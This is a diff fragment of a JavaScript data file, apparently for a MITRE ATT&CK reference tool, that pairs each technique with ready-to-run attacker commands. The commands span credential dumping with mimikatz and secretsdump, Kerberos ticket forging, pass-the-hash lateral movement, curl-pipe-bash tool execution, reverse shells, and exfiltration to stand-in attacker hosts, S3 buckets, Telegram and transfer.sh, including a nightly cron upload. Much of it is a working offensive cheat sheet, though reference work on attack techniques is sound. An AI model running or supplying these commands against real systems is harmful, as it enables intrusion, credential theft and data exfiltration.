+    sub:[{id:".001",name:"LSASS Memory"},{id:".002",name:"Security Account Manager"},{id:".003",name:"NTDS"},{id:".004",name:"LSA Secrets"},{id:".005",name:"Cached Domain Credentials"},{id:".006",name:"DCSync"},{id:".007",name:"Proc Filesystem"},{id:".008",name:"Clipbook"}],
+    cmds:[{c:"mimikatz# sekurlsa::logonpasswords",n:"Extract all LSASS credentials"},{c:"impacket-secretsdump CORP/admin:pass@DC01",n:"Remote NTDS dump via DCSync"},{c:"procdump.exe -ma lsass.exe lsass.dmp  # offline dump",n:"LSASS memory dump"}]},
+   {id:"T1528",name:"Steal Application Access Token",desc:"Steal OAuth/bearer tokens for application access.",
+    sub:[],cmds:[{c:"# Extract tokens from browser localStorage / cookie jar",n:"Browser token theft"},{c:"# Enumerate Azure Managed Identity token endpoint",n:"IMDS token theft"}]},
+   {id:"T1558",name:"Steal or Forge Kerberos Tickets",desc:"Golden/Silver ticket attacks.",
+    sub:[{id:".001",name:"Golden Ticket"},{id:".002",name:"Silver Ticket"},{id:".003",name:"Kerberoasting"},{id:".004",name:"AS-REP Roasting"},{id:".005",name:"CCACHE Files"},{id:".006",name:"PKINIT Abuse"}],
+    cmds:[{c:"mimikatz# kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH",n:"Golden Ticket creation"},{c:"impacket-GetUserSPNs corp.local/user:pass -request -outputfile tgs.txt",n:"Kerberoasting"},{c:"impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass",n:"AS-REP Roasting"}]},
+   {id:"T1539",name:"Steal Web Session Cookie",desc:"Steal browser session cookies.",
+    sub:[],cmds:[{c:"# EditThisCookie / Cookie export from compromised browser",n:"Manual cookie theft"},{c:"evilginx2  # AiTM: capture cookies in realtime",n:"Real-time session cookie capture"}]},
+   {id:"T1552",name:"Unsecured Credentials",desc:"Find credentials in files, env vars, cloud metadata.",
+    sub:[{id:".001",name:"Credentials In Files"},{id:".002",name:"Credentials in Registry"},{id:".003",name:"Bash History"},{id:".004",name:"Private Keys"},{id:".005",name:"Cloud Instance Metadata API"},{id:".006",name:"Group Policy Preferences"},{id:".007",name:"Container API"},{id:".008",name:"Chat Messages"}],
+    cmds:[{c:"grep -rE '(password|passwd|secret|token)\\s*[=:]' /etc /home /opt 2>/dev/null",n:"Credential grep across filesystem"},{c:"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",n:"AWS IMDS credential theft"},{c:"find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null | xargs grep -l pass",n:"Config files with passwords"}]},
+  ]},
+
+ {id:"TA0007",name:"Discovery",color:"#48cae4",desc:"Figure out environment structure.",
+  techs:[
+   {id:"T1087",name:"Account Discovery",desc:"Enumerate local/domain/cloud accounts.",
+    sub:[{id:".001",name:"Local Account"},{id:".002",name:"Domain Account"},{id:".003",name:"Email Account"},{id:".004",name:"Cloud Account"}],
+    cmds:[{c:"cat /etc/passwd | grep -v nologin",n:"Local Linux accounts"},{c:"ldapsearch -x -H ldap://DC01 -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName",n:"AD LDAP user enum"},{c:"BloodHound-python -c All -u user -p pass -ns 10.0.0.1 -d corp.local",n:"Full BloodHound data collection"}]},
+   {id:"T1010",name:"Application Window Discovery",desc:"List open application windows.",
+    sub:[],cmds:[{c:"# EnumWindows Win32 API to list all windows",n:"Enumerate open windows"},{c:"xdotool search --name ''  # Linux X11 window list",n:"X11 window enumeration"}]},
+   {id:"T1217",name:"Browser Information Discovery",desc:"Enumerate browser bookmarks, history, accounts.",
+    sub:[],cmds:[{c:"find /home -name 'Bookmarks' -path '*/chrome/*' 2>/dev/null",n:"Chrome bookmarks"},{c:"cat ~/Library/Application\\ Support/Firefox/Profiles/*/places.sqlite | strings | grep http",n:"Firefox browsing history"}]},
+   {id:"T1580",name:"Cloud Infrastructure Discovery",desc:"Enumerate cloud compute, storage, services.",
+    sub:[],cmds:[{c:"aws ec2 describe-instances --output table",n:"List all EC2 instances"},{c:"az vm list --output table",n:"List Azure VMs"},{c:"gcloud compute instances list",n:"List GCP VMs"}]},
+   {id:"T1538",name:"Cloud Service Dashboard",desc:"Use cloud console GUI with stolen credentials.",
+    sub:[],cmds:[{c:"# Login to AWS Console with stolen credentials",n:"AWS web console access"},{c:"# Azure Portal credential abuse",n:"Azure portal enumeration"}]},
+   {id:"T1526",name:"Cloud Service Discovery",desc:"Enumerate cloud services: Lambda, S3, RDS.",
+    sub:[],cmds:[{c:"aws s3 ls  && aws lambda list-functions && aws rds describe-db-instances",n:"AWS service enumeration"},{c:"az resource list --output table",n:"All Azure resources"}]},
+   {id:"T1619",name:"Cloud Storage Object Discovery",desc:"Enumerate objects in S3/GCS/Azure Blob.",
+    sub:[],cmds:[{c:"aws s3 ls s3://bucket-name --recursive",n:"S3 bucket object listing"},{c:"gsutil ls -r gs://bucket-name",n:"GCS bucket enumeration"}]},
+   {id:"T1613",name:"Container and Resource Discovery",desc:"Enumerate containers, pods, K8s resources.",
+    sub:[],cmds:[{c:"kubectl get pods,services,deployments --all-namespaces",n:"K8s resource enumeration"},{c:"docker ps -a && docker network ls",n:"Container and network listing"}]},
+   {id:"T1622",name:"Debugger Evasion",desc:"Check for debuggers before execution.",
+    sub:[],cmds:[{c:"# IsDebuggerPresent, NtQueryInformationProcess",n:"Win32 anti-debug detection"}]},
+   {id:"T1482",name:"Domain Trust Discovery",desc:"Enumerate domain trusts.",
+    sub:[],cmds:[{c:"nltest /domain_trusts /all_trusts",n:"Windows domain trust enum"},{c:"Get-ADTrust -Filter * | Select Name,Direction,TrustType",n:"PowerShell AD trust enum"}]},
+   {id:"T1083",name:"File and Directory Discovery",desc:"Enumerate files, sensitive data locations.",
+    sub:[],cmds:[{c:"find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.pem' 2>/dev/null",n:"Hunt key material"},{c:"Get-ChildItem -Path C:\\ -Recurse -Include *.kdbx,*.pfx 2>$null",n:"PowerShell file search"}]},
+   {id:"T1592",name:"Gather Victim Host Info",desc:"Hardware, software, firmware, client config.",
+    sub:[{id:".002",name:"Software"}],
+    cmds:[{c:"wmic product get name,version  # installed software",n:"Windows installed software list"}]},
+   {id:"T1654",name:"Log Enumeration",desc:"Enumerate logs to understand environment.",
+    sub:[],cmds:[{c:"cat /var/log/auth.log | grep -i 'accept\\|fail'",n:"SSH auth log analysis"},{c:"wevtutil qe Security /count:100 /format:text",n:"Windows Security event log"}]},
+   {id:"T1046",name:"Network Service Discovery",desc:"Identify live hosts and open services.",
+    sub:[],cmds:[{c:"nmap -sn 10.0.0.0/24 -oG - | awk '/Up/{print $2}'",n:"Ping sweep, extract alive hosts"},{c:"nmap -sV -p 22,80,443,445,3389 --open -T3 10.0.0.0/24",n:"Common services scan"},{c:"for i in {1..254};do (ping -c1 10.0.0.$i >/dev/null && echo 10.0.0.$i)&done",n:"Bash ping sweep"}]},
+   {id:"T1135",name:"Network Share Discovery",desc:"Enumerate network shares.",
+    sub:[],cmds:[{c:"smbclient -L //10.0.0.5 -N",n:"List SMB shares anonymously"},{c:"crackmapexec smb 10.0.0.0/24 --shares",n:"Mass SMB share enumeration"}]},
+   {id:"T1040",name:"Network Sniffing",desc:"Capture traffic to map network.",
+    sub:[],cmds:[{c:"tcpdump -i eth0 -nn -w /tmp/cap.pcap",n:"Passive network capture"},{c:"ngrep -q '.' 'host 10.0.0.1'",n:"String grep in network traffic"}]},
+   {id:"T1201",name:"Password Policy Discovery",desc:"Determine account lockout and complexity policies.",
+    sub:[],cmds:[{c:"net accounts /domain",n:"Windows domain password policy"},{c:"crackmapexec smb DC01 -u user -p pass --pass-pol",n:"CME password policy dump"}]},
+   {id:"T1120",name:"Peripheral Device Discovery",desc:"Enumerate connected USB, printers, cameras.",
+    sub:[],cmds:[{c:"lsusb && lspci  # Linux devices",n:"List USB and PCI devices"},{c:"Get-PnpDevice | Where Status -eq 'OK'",n:"Windows PnP device list"}]},
+   {id:"T1069",name:"Permission Groups Discovery",desc:"Enumerate local and domain groups.",
+    sub:[{id:".001",name:"Local Groups"},{id:".002",name:"Domain Groups"},{id:".003",name:"Cloud Groups"}],
+    cmds:[{c:"net localgroup administrators",n:"Windows local admin group"},{c:"Get-ADGroup -Filter * | Get-ADGroupMember | Select Name,SamAccountName",n:"All AD group members"}]},
+   {id:"T1057",name:"Process Discovery",desc:"List running processes.",
+    sub:[],cmds:[{c:"ps auxf  # process tree",n:"Linux process list with tree"},{c:"tasklist /v /fo csv",n:"Windows detailed process list"}]},
+   {id:"T1012",name:"Query Registry",desc:"Enumerate Windows Registry for configuration.",
+    sub:[],cmds:[{c:"reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",n:"Autorun registry keys"},{c:"reg query HKCU /s /f password",n:"Search registry for passwords"}]},
+   {id:"T1018",name:"Remote System Discovery",desc:"Identify other hosts on the network.",
+    sub:[],cmds:[{c:"net view /domain  # Windows",n:"Enumerate domain computers via SMB"},{c:"ldapsearch -x -b 'DC=corp,DC=local' '(objectClass=computer)' cn",n:"LDAP computer enumeration"}]},
+   {id:"T1518",name:"Software Discovery",desc:"Enumerate installed software and versions.",
+    sub:[{id:".001",name:"Security Software Discovery"}],
+    cmds:[{c:"dpkg -l && rpm -qa  # Linux packages",n:"Installed package list"},{c:"Get-WmiObject Win32_Product | Select Name,Version",n:"Windows installed software"}]},
+   {id:"T1082",name:"System Information Discovery",desc:"OS, hardware, virtualisation, patch level.",
+    sub:[],cmds:[{c:"uname -a && id && cat /etc/os-release && hostnamectl",n:"Linux system info"},{c:"systeminfo | findstr /B /C:'OS Name' /C:'Domain'",n:"Windows system info"},{c:"env | grep -i 'aws\\|azure\\|gcp\\|cloud'",n:"Cloud provider detection"}]},
+   {id:"T1614",name:"System Location Discovery",desc:"Determine geographic location.",
+    sub:[{id:".001",name:"System Language Discovery"}],
+    cmds:[{c:"curl ipinfo.io/json",n:"Geolocate via external service"},{c:"localectl  # Linux locale",n:"System locale/language"}]},
+   {id:"T1016",name:"System Network Configuration Discovery",desc:"IP, routes, ARP, DNS, proxy settings.",
+    sub:[{id:".001",name:"Internet Connection Discovery"},{id:".002",name:"Wifi Discovery"}],
+    cmds:[{c:"ip a && ip r && cat /etc/resolv.conf && arp -a",n:"Full network config dump"},{c:"netstat -rn && ipconfig /all",n:"Windows network config"}]},
+   {id:"T1049",name:"System Network Connections Discovery",desc:"Enumerate active connections and ports.",
+    sub:[],cmds:[{c:"ss -tunp && netstat -tunp",n:"All open sockets with processes"},{c:"Get-NetTCPConnection | Select LocalAddress,LocalPort,RemoteAddress,State",n:"Windows TCP connections"}]},
+   {id:"T1033",name:"System Owner/User Discovery",desc:"Determine current user and context.",
+    sub:[],cmds:[{c:"id && whoami && groups && who",n:"Current user identity"},{c:"whoami /priv /groups  # Windows token details",n:"Windows privileges and group memberships"}]},
+   {id:"T1007",name:"System Service Discovery",desc:"Enumerate running services.",
+    sub:[],cmds:[{c:"systemctl list-units --type=service --state=running",n:"Running systemd services"},{c:"sc query type= all state= all",n:"Windows all service states"}]},
+   {id:"T1124",name:"System Time Discovery",desc:"Determine system time for scheduling or AV evasion.",
+    sub:[],cmds:[{c:"date && timedatectl",n:"System time and timezone"},{c:"net time \\\\DC01",n:"Windows: DC time sync"}]},
+   {id:"T1497",name:"Virtualization/Sandbox Evasion",desc:"Detect VM/sandbox environment.",
+    sub:[{id:".001",name:"System Checks"},{id:".002",name:"User Activity Based Checks"},{id:".003",name:"Time Based Evasion"}],
+    cmds:[{c:"dmidecode -s system-manufacturer | grep -i vmware",n:"VMware detection"},{c:"# Check MAC OUI: 00:0C:29 = VMware, 08:00:27 = VirtualBox",n:"VM MAC address detection"}]},
+  ]},
+
+ {id:"TA0008",name:"Lateral Movement",color:"#f72585",desc:"Move through the environment.",
+  techs:[
+   {id:"T1210",name:"Exploitation of Remote Services",desc:"Exploit vulnerability in remote service for lateral movement.",
+    sub:[],cmds:[{c:"impacket-smbexec -hashes :NTLMhash corp/admin@10.0.0.5",n:"SMB lateral movement"},{c:"# EternalBlue: msfconsole exploit/windows/smb/ms17_010_eternalblue",n:"MS17-010 lateral movement"}]},
+   {id:"T1534",name:"Internal Spearphishing",desc:"Phish internal users from compromised account.",
+    sub:[],cmds:[{c:"# Send phishing from compromised internal email account",n:"Internal phishing via compromised mailbox"}]},
+   {id:"T1570",name:"Lateral Tool Transfer",desc:"Copy tools between systems.",
+    sub:[],cmds:[{c:"scp implant root@10.0.0.5:/tmp/.beacon",n:"SCP tool transfer"},{c:"# SMB: copy evil.exe \\\\target\\c$\\windows\\temp\\",n:"SMB file copy"},{c:"impacket-smbclient corp/admin:pass@10.0.0.5",n:"Interactive SMB shell for file ops"}]},
+   {id:"T1563",name:"Remote Service Session Hijacking",desc:"Hijack existing RDP/SSH sessions.",
+    sub:[{id:".001",name:"SSH Hijacking"},{id:".002",name:"RDP Hijacking"}],
+    cmds:[{c:"query session && tscon 2 /dest:rdp-tcp#0",n:"Hijack disconnected RDP session"},{c:"# SSH agent hijacking: SSH_AUTH_SOCK",n:"Steal SSH agent socket"}]},
+   {id:"T1021",name:"Remote Services",desc:"Use remote services for lateral movement.",
+    sub:[{id:".001",name:"Remote Desktop Protocol"},{id:".002",name:"SMB/Windows Admin Shares"},{id:".003",name:"Distributed Component Object Model"},{id:".004",name:"SSH"},{id:".005",name:"VNC"},{id:".006",name:"Windows Remote Management"},{id:".007",name:"Cloud Services"},{id:".008",name:"Direct Cloud VM Connections"}],
+    cmds:[{c:"xfreerdp /u:admin /p:'P@ss' /v:10.0.0.5 /cert-ignore",n:"RDP lateral movement"},{c:"evil-winrm -i 10.0.0.5 -u admin -H NTLMhash",n:"WinRM with PtH"},{c:"ssh -J bastion user@internal.host",n:"SSH jump host (ProxyJump)"}]},
+   {id:"T1091",name:"Replication Through Removable Media",desc:"Spread to other systems via USB.",
+    sub:[],cmds:[{c:"# Autorun.inf: copy payload to all USB drives",n:"USB worm propagation"}]},
+   {id:"T1072",name:"Software Deployment Tools",desc:"Use deployment infra for lateral movement.",
+    sub:[],cmds:[{c:"ansible -i inventory webservers -m shell -a 'whoami' -b",n:"Ansible lateral exec"}]},
+   {id:"T1080",name:"Taint Shared Content",desc:"Plant malicious content in shared network resources.",
+    sub:[],cmds:[{c:"cp payload.exe '\\\\fileserver\\IT\\startup\\update.exe'",n:"Taint startup scripts share"},{c:"# Modify shared Office template (Normal.dotm on file server)",n:"Office template poisoning"}]},
+   {id:"T1550",name:"Use Alternate Authentication Material",desc:"PtH, PtT for lateral movement.",
+    sub:[{id:".002",name:"Pass the Hash"},{id:".003",name:"Pass the Ticket"}],
+    cmds:[{c:"impacket-psexec -hashes :NTLMhash admin@10.0.0.5 'whoami'",n:"Pass-the-Hash exec"},{c:"mimikatz# kerberos::ptt ticket.kirbi && klist",n:"Pass-the-Ticket"}]},
+  ]},
+
+ {id:"TA0009",name:"Collection",color:"#ffba08",desc:"Gather data of interest.",
+  techs:[
+   {id:"T1557",name:"Adversary-in-the-Middle",desc:"Intercept data in transit.",
+    sub:[{id:".001",name:"LLMNR/NBT-NS Poisoning"},{id:".002",name:"ARP Cache Poisoning"}],
+    cmds:[{c:"responder -I eth0 -wrf  # capture + relay",n:"MITM for credential capture"}]},
+   {id:"T1560",name:"Archive Collected Data",desc:"Archive/compress data before exfiltration.",
+    sub:[{id:".001",name:"Archive via Utility"},{id:".002",name:"Archive via Library"},{id:".003",name:"Archive via Custom Method"}],
+    cmds:[{c:"tar czf /tmp/.arch.tgz /home /etc /var/mail",n:"Tar+gzip compress"},{c:"7z a -p'S3cr3t' -mhe=on /tmp/out.7z /sensitive/",n:"Encrypted 7z archive"},{c:"zip -r -P 'password123' /tmp/data.zip /home/user/",n:"Encrypted ZIP"}]},
+   {id:"T1123",name:"Audio Capture",desc:"Capture microphone audio.",
+    sub:[],cmds:[{c:"arecord -f cd -t wav -d 60 /tmp/audio.wav",n:"Linux: record 60s audio"},{c:"meterpreter> run post/multi/gather/audio_capture",n:"Meterpreter audio capture"}]},
+   {id:"T1119",name:"Automated Collection",desc:"Automated scripts to collect data at scale.",
+    sub:[],cmds:[{c:"find / -name '*.docx' -o -name '*.xlsx' -o -name '*.pdf' 2>/dev/null | xargs -I{} cp {} /tmp/loot/",n:"Mass document collection"},{c:"# PowerShell: recursive file collect by extension",n:"Automated file staging"}]},
+   {id:"T1185",name:"Browser Session Hijacking",desc:"Hijack authenticated browser sessions.",
+    sub:[],cmds:[{c:"# Inject JS via XSS to extract cookies: document.cookie",n:"Browser session theft via XSS"}]},
+   {id:"T1115",name:"Clipboard Data",desc:"Capture clipboard content.",
+    sub:[],cmds:[{c:"xclip -o -selection clipboard  # Linux",n:"Read clipboard on Linux"},{c:"Get-Clipboard  # PowerShell",n:"Read clipboard on Windows"}]},
+   {id:"T1530",name:"Data from Cloud Storage",desc:"Access cloud storage objects.",
+    sub:[],cmds:[{c:"aws s3 cp s3://corp-backup/ /tmp/loot/ --recursive",n:"S3 bucket exfil"},{c:"gsutil cp -r gs://corp-data/ /tmp/",n:"GCS bucket copy"}]},
+   {id:"T1602",name:"Data from Configuration Repository",desc:"Collect from network device configs (SNMP, TFTP).",
+    sub:[{id:".001",name:"SNMP (MIB Dump)"},{id:".002",name:"Network Device Configuration Dump"}],
+    cmds:[{c:"snmpwalk -v2c -c public 10.0.0.1",n:"SNMP MIB walk"},{c:"snmpget -v1 -c public 10.0.0.1 1.3.6.1.2.1.1.1.0",n:"SNMP system description"}]},
+   {id:"T1213",name:"Data from Information Repositories",desc:"SharePoint, Confluence, GitHub, wikis.",
+    sub:[{id:".001",name:"Confluence"},{id:".002",name:"SharePoint"},{id:".003",name:"Code Repositories"},{id:".004",name:"Messaging Applications"}],
+    cmds:[{c:"# Confluence API: GET /rest/api/content?type=page&limit=500",n:"Confluence bulk page dump"},{c:"trufflehog github --repo https://github.com/corp/private-repo",n:"Scan repo for secrets"}]},
+   {id:"T1005",name:"Data from Local System",desc:"Collect sensitive files from local system.",
+    sub:[],cmds:[{c:"find / -name '*.kdbx' -o -name 'id_rsa' -o -name 'wallet.dat' 2>/dev/null | xargs cp -t /tmp/loot/",n:"Hunt key material"},{c:"mysqldump -u root -p database > /tmp/db.sql",n:"Full database dump"},{c:"cp /etc/shadow /etc/passwd /tmp/loot/",n:"Password files"}]},
+   {id:"T1039",name:"Data from Network Shared Drive",desc:"Collect data from SMB/NFS shares.",
+    sub:[],cmds:[{c:"smbclient //10.0.0.5/Finance -U admin -c 'recurse; mget *' ",n:"Recursive SMB share download"},{c:"mount -t nfs 10.0.0.5:/share /mnt/nfs && cp -r /mnt/nfs /tmp/loot/",n:"NFS mount and copy"}]},
+   {id:"T1025",name:"Data from Removable Media",desc:"Collect data from USB/CD-ROM.",
+    sub:[],cmds:[{c:"find /media /mnt -type f 2>/dev/null | xargs cp -t /tmp/loot/",n:"Copy data from mounted removable media"}]},
+   {id:"T1074",name:"Data Staged",desc:"Stage collected data locally or remotely before exfil.",
+    sub:[{id:".001",name:"Local Data Staging"},{id:".002",name:"Remote Data Staging"}],
+    cmds:[{c:"mkdir -p /tmp/.stage && rsync -avz /sensitive /tmp/.stage/",n:"Local staging"},{c:"scp /tmp/.stage.tgz pivot@10.0.0.5:/tmp/  # remote stage",n:"Stage on pivot before exfil"}]},
+   {id:"T1114",name:"Email Collection",desc:"Collect emails from mail clients/servers.",
+    sub:[{id:".001",name:"Local Email Collection"},{id:".002",name:"Remote Email Collection"},{id:".003",name:"Email Forwarding Rule"}],
+    cmds:[{c:"# MailSniper: Search-Mailbox -Identity victim -SearchQuery 'password'",n:"Exchange mailbox search"},{c:"# Set email forwarding rule to attacker address",n:"Malicious forward rule"}]},
+   {id:"T1056",name:"Input Capture",desc:"Keylog, API hook, credential prompt capture.",
+    sub:[{id:".001",name:"Keylogging"},{id:".002",name:"GUI Input Capture"},{id:".003",name:"Web Portal Capture"},{id:".004",name:"Credential API Hooking"}],
+    cmds:[{c:"meterpreter> keyscan_start && sleep 300 && keyscan_dump",n:"Keylog for 5 minutes"}]},
+   {id:"T1113",name:"Screen Capture",desc:"Take screenshots of user desktop.",
+    sub:[],cmds:[{c:"scrot -u /tmp/sc_$(date +%s).png",n:"Linux screenshot"},{c:"meterpreter> screenshot",n:"Meterpreter screen capture"},{c:"import -window root /tmp/full.png  # ImageMagick",n:"Full desktop capture"}]},
+   {id:"T1125",name:"Video Capture",desc:"Capture webcam/screen video.",
+    sub:[],cmds:[{c:"ffmpeg -f v4l2 -i /dev/video0 -t 30 /tmp/cam.mp4",n:"Linux webcam capture"},{c:"meterpreter> run post/multi/gather/webcam_capture",n:"Meterpreter webcam snapshot"}]},
+  ]},
+
+ {id:"TA0011",name:"Command & Control",color:"#80ed99",desc:"Communicate with and control compromised systems.",
+  techs:[
+   {id:"T1071",name:"Application Layer Protocol",desc:"C2 over HTTP/HTTPS/DNS/FTP/SMTP to blend with legit traffic.",
+    sub:[{id:".001",name:"Web Protocols"},{id:".002",name:"File Transfer Protocols"},{id:".003",name:"Mail Protocols"},{id:".004",name:"DNS"},{id:".005",name:"Publish/Subscribe Protocols"}],
+    cmds:[{c:"msfconsole -x 'use multi/handler; set payload linux/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; run'",n:"HTTPS reverse shell handler"},{c:"# DNS C2: TXT record queries as beacons",n:"DNS C2 channel"}]},
+   {id:"T1092",name:"Communication Through Removable Media",desc:"C2 via USB on air-gapped networks.",
+    sub:[],cmds:[{c:"# Write commands to USB, read from air-gapped host",n:"Air-gap jumping via USB"}]},
+   {id:"T1132",name:"Data Encoding",desc:"Encode C2 traffic to evade detection.",
+    sub:[{id:".001",name:"Standard Encoding"},{id:".002",name:"Non-Standard Encoding"}],
+    cmds:[{c:"# Base64 encode C2 beacon data in HTTP body",n:"Standard encoding evasion"},{c:"# Custom XOR key encoding of C2 traffic",n:"Non-standard encoding"}]},
+   {id:"T1001",name:"Data Obfuscation",desc:"Obfuscate C2 traffic content.",
+    sub:[{id:".001",name:"Junk Data"},{id:".002",name:"Steganography"},{id:".003",name:"Protocol Impersonation"}],
+    cmds:[{c:"# Pad C2 packets with junk to meet minimum size",n:"Junk data padding"},{c:"# Cobalt Strike Malleable C2: mimic legitimate protocol",n:"Protocol impersonation"}]},
+   {id:"T1568",name:"Dynamic Resolution",desc:"Dynamically calculate C2 using DGA or fast-flux.",
+    sub:[{id:".001",name:"Fast Flux DNS"},{id:".002",name:"Domain Generation Algorithms"},{id:".003",name:"DNS Calculation"}],
+    cmds:[{c:"# DGA: generate domains based on date seed",n:"Domain generation algorithm"},{c:"# Fast-flux: rapid DNS TTL rotation",n:"Fast-flux DNS network"}]},
+   {id:"T1573",name:"Encrypted Channel",desc:"Encrypt C2 communications.",
+    sub:[{id:".001",name:"Symmetric Cryptography"},{id:".002",name:"Asymmetric Cryptography"}],
+    cmds:[{c:"# Sliver: mTLS (mutual TLS) encrypted C2",n:"mTLS C2 channel"},{c:"# Cobalt Strike: RC4-encrypted Beacon protocol",n:"Symmetric encrypted C2"}]},
+   {id:"T1008",name:"Fallback Channels",desc:"Multiple C2 channels for resilience.",
+    sub:[],cmds:[{c:"# Primary: HTTPS | Fallback: DNS | Last resort: ICMP",n:"Multi-channel C2 design"}]},
+   {id:"T1105",name:"Ingress Tool Transfer",desc:"Transfer tools to compromised system.",
+    sub:[],cmds:[{c:"curl -s http://10.0.0.1/linpeas.sh | bash",n:"Stream and execute tool"},{c:"wget http://10.0.0.1/chisel -O /tmp/chisel && chmod +x /tmp/chisel",n:"Download tool to disk"}]},
+   {id:"T1104",name:"Multi-Stage Channels",desc:"Use staged C2: initial dropper → full implant.",
+    sub:[],cmds:[{c:"# Stage 1: small stager → download full Meterpreter",n:"Staged payload delivery"}]},
+   {id:"T1095",name:"Non-Application Layer Protocol",desc:"Raw TCP/UDP/ICMP for C2.",
+    sub:[],cmds:[{c:"ncat --ssl -lvp 4444  # SSL raw TCP listener",n:"SSL raw TCP C2"},{c:"ptunnel-ng -p attacker.com -lp 4444 -da 127.0.0.1 -dp 22",n:"ICMP tunnel C2"}]},
+   {id:"T1571",name:"Non-Standard Port",desc:"Use unexpected ports for C2 (DNS on 4444, HTTP on 8443).",
+    sub:[],cmds:[{c:"ncat -lvp 53 -e /bin/bash  # C2 on DNS port",n:"Reverse shell on port 53"}]},
+   {id:"T1572",name:"Protocol Tunneling",desc:"Tunnel C2 through legitimate protocols.",
+    sub:[],cmds:[{c:"chisel server -p 8080 --reverse  # attacker\nchisel client attacker.com:8080 R:1080:socks  # victim",n:"TCP over HTTP tunnel + SOCKS proxy"},{c:"iodine -f -P pass tunnel.attacker.com",n:"IP over DNS tunnel"},{c:"ngrok tcp 4444",n:"Ngrok TCP tunnel bypass"}]},
+   {id:"T1090",name:"Proxy",desc:"Route C2 through proxies to obscure origin.",
+    sub:[{id:".001",name:"Internal Proxy"},{id:".002",name:"External Proxy"},{id:".003",name:"Multi-hop Proxy"},{id:".004",name:"Domain Fronting"}],
+    cmds:[{c:"ssh -D 1080 -N -f pivot@10.0.0.5  # SOCKS via SSH",n:"SSH dynamic SOCKS proxy"},{c:"proxychains nmap -sT -Pn 10.0.0.10",n:"Tool via SOCKS proxy chain"},{c:"# Domain fronting: Host header differs from SNI",n:"CDN domain fronting"}]},
+   {id:"T1219",name:"Remote Access Software",desc:"Use legitimate RAT/RMM tools for C2.",
+    sub:[{id:".001",name:"Remote Desktop Software"},{id:".002",name:"Screen Capture Software"},{id:".003",name:"Remote Access Hardware"},{id:".004",name:"Cloud-Based Remote Access"}],
+    cmds:[{c:"# AnyDesk / TeamViewer: install silent, use for persistent access",n:"Legitimate RMM tool abuse"},{c:"# ngrok + SSH: expose SSH over ngrok HTTPS",n:"Cloud-based tunnel access"}]},
+   {id:"T1205",name:"Traffic Signaling",desc:"Activate backdoor via special packets.",
+    sub:[{id:".001",name:"Port Knocking"},{id:".002",name:"Socket Filters"}],
+    cmds:[{c:"knock 10.0.0.1 8881 7777 9991 && ssh root@10.0.0.1",n:"Port knock + SSH"}]},
+   {id:"T1102",name:"Web Service",desc:"Use legitimate web services as C2 channel.",
+    sub:[{id:".001",name:"Dead Drop Resolver"},{id:".002",name:"Bidirectional Communication"},{id:".003",name:"One-Way Communication"}],
+    cmds:[{c:"# Use GitHub Gist / Pastebin as dead-drop C2 config",n:"Dead drop C2 resolver"},{c:"# Slack/Discord bot as C2 communication channel",n:"Chat service C2 channel"}]},
+  ]},
+
+ {id:"TA0010",name:"Exfiltration",color:"#ff6b35",desc:"Steal collected data from the environment.",
+  techs:[
+   {id:"T1020",name:"Automated Exfiltration",desc:"Automatically exfiltrate data, e.g. traffic duplication.",
+    sub:[{id:".001",name:"Traffic Duplication"}],
+    cmds:[{c:"# Configure SPAN/mirror port on switch to attacker",n:"Network traffic duplication"},{c:"# AWS VPC Traffic Mirroring to attacker target",n:"Cloud traffic mirror"}]},
+   {id:"T1030",name:"Data Transfer Size Limits",desc:"Break exfil into small chunks to avoid detection.",
+    sub:[],cmds:[{c:"split -b 1M /tmp/archive.tgz /tmp/chunk_",n:"Split file into 1MB chunks"},{c:"# Send 100KB/s max to avoid bandwidth anomalies",n:"Rate-limited exfiltration"}]},
+   {id:"T1048",name:"Exfiltration Over Alternative Protocol",desc:"Exfil via non-standard channels.",
+    sub:[{id:".001",name:"Exfiltration Over Symmetric Encrypted Non-C2 Protocol"},{id:".002",name:"Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"},{id:".003",name:"Exfiltration Over Unencrypted Non-C2 Protocol"}],
+    cmds:[{c:"scp /tmp/loot.tgz attacker@c2.attacker.com:~/",n:"SCP exfiltration"},{c:"ftp -n attacker.com <<EOF\nuser anon anon\nput /tmp/loot.tgz\nEOF",n:"FTP exfiltration"},{c:"dnscat2 --dns server=attacker.com  # DNS exfil",n:"DNS tunnel exfiltration"}]},
+   {id:"T1041",name:"Exfiltration Over C2 Channel",desc:"Use existing C2 to exfiltrate.",
+    sub:[],cmds:[{c:"meterpreter> download /etc/shadow /loot/shadow.txt",n:"Meterpreter file download"},{c:"sliver> download /sensitive/data /local/",n:"Sliver C2 exfil"}]},
+   {id:"T1011",name:"Exfiltration Over Other Network Medium",desc:"Exfil over Bluetooth, cellular, RF.",
+    sub:[{id:".001",name:"Exfiltration Over Bluetooth"}],
+    cmds:[{c:"# BLE data beacon: exfil small amounts over Bluetooth",n:"Bluetooth exfiltration"}]},
+   {id:"T1052",name:"Exfiltration Over Physical Medium",desc:"Exfil via USB/removable media.",
+    sub:[{id:".001",name:"Exfiltration over USB"}],
+    cmds:[{c:"cp /tmp/loot.tgz /media/usb/backup.tgz",n:"Copy data to USB for physical exfil"}]},
+   {id:"T1567",name:"Exfiltration Over Web Service",desc:"Exfil to cloud storage or web services.",
+    sub:[{id:".001",name:"Exfiltration to Code Repository"},{id:".002",name:"Exfiltration to Cloud Storage"},{id:".003",name:"Exfiltration to Text Storage Sites"},{id:".004",name:"Exfiltration Over Webhook"}],
+    cmds:[{c:"aws s3 cp /tmp/loot.tgz s3://attacker-bucket/",n:"S3 exfiltration"},{c:"curl -F 'data=@/tmp/loot.tgz' https://api.telegram.org/bot<TOKEN>/sendDocument",n:"Telegram bot file upload"},{c:"curl -F 'file=@/tmp/loot.tgz' https://transfer.sh/",n:"transfer.sh exfiltration"}]},
+   {id:"T1029",name:"Scheduled Transfer",desc:"Exfiltrate at specific times to evade detection.",
+    sub:[],cmds:[{c:"cron: 23 02 * * * curl -F 'f=@/tmp/loot.tgz' https://c2/upload",n:"Nightly 2AM exfiltration cron"},{c:"# Exfil during business hours to blend with traffic",n:"Business hours scheduled transfer"}]},
+  ]},
+
